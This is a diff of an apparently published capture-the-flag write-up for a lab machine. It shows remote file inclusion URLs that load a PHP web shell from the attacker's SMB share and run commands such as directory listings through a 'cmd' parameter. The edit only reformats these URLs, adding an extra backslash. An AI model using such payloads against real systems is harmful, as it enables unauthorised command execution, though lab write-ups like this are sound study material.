@@ -260,14 +260,10 @@ force user = nobody
 </code></pre><p>I&rsquo;ve also created a Gist that contains these 2 things, as well as a Python based wrapper script that can be used to execute commands on the machine directly. All of those things can be found here:</p>
 <p><a href="https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e">Sniper Gist by 5ysk3y</a></p>
 <p>To exploit this using this script we call our malicious file via the SMB share in the url as follows:</p>
-<blockquote>
-<p>http://10.10.10.151/blog/?lang=\\10.10.14.34\share\hax.php</p>
-</blockquote>
+<p><code>http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php</code></p>
 <p>This returns the HTML elements of the script, when we view the source; to use it, we append <code>&amp;cmd=some+command+here</code> to the url (make sure to change the request type to POST as well).</p>
 <p>From there, we can run commands, e.g:</p>
-<blockquote>
-<p>http://10.10.10.151/blog/?lang=\\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</p>
-</blockquote>
+<p><code>http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</code></p>
 <p>To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:</p>
 <pre><code>10/01/2019  08:44 AM    &lt;DIR&gt;          .
 10/01/2019  08:44 AM    &lt;DIR&gt;          ..
